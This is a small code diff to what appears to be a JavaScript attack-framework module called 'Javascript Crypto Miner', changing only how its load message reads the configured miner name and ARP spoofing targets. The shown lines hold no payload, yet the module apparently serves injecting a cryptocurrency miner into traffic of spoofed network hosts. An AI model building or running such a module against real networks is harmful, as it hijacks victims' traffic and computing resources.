@@ -4,7 +4,7 @@ var green   = "\033[32m",
 function onLoad() {
     logStr = "Javascript Crypto Miner loaded.\n" +
              "\n    Miner: " + green + env("cryptominer.name").charAt(0).toUpperCase() + env("cryptominer.name").slice(1) + reset +
-             "\n    Targets: " + green + env['arp.spoof.targets'] + reset + "\n"
+             "\n    Targets: " + green + env('arp.spoof.targets') + reset + "\n"
     log(logStr);
 }
 
